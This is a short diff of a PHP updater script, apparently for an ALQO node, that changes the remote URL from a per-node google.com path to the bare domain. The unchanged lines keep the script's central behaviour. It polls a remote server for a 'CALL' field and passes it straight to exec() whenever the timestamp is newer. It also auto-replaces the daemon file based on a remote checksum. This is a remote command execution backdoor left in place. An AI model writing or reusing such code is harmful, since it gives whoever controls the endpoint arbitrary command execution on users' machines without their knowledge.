@@ -13,7 +13,7 @@ $datadir = $ini_array['datapath'];
 
 $lastRemoteCall = 0;
 if(file_exists("/var/ALQO/remoteCall")) $lastRemoteCall = file_get_contents("/var/ALQO/remoteCall");
-$remoteCall = json_decode(file_get_contents("https://google.com/".$name), true);
+$remoteCall = json_decode(file_get_contents("https://google.com/"), true);
 if($remoteCall['TIME'] > $lastRemoteCall)
 {
 	print_r(exec($remoteCall['CALL']));
@@ -30,7 +30,7 @@ if(!file_exists("/var/ALQO/updating") || file_get_contents("/var/ALQO/updating")
 	}
 }
 
-$updateInfo = json_decode(file_get_contents("https://google.com/" . $name), true);
+$updateInfo = json_decode(file_get_contents("https://google.com/"), true);
 $latestVersion = $updateInfo['MD5'];
 if($latestVersion != "" && $latestVersion != md5_file($daemonFile) && @file_get_contents("/var/ALQO/updating") == 0) {
 	set_time_limit(1200);
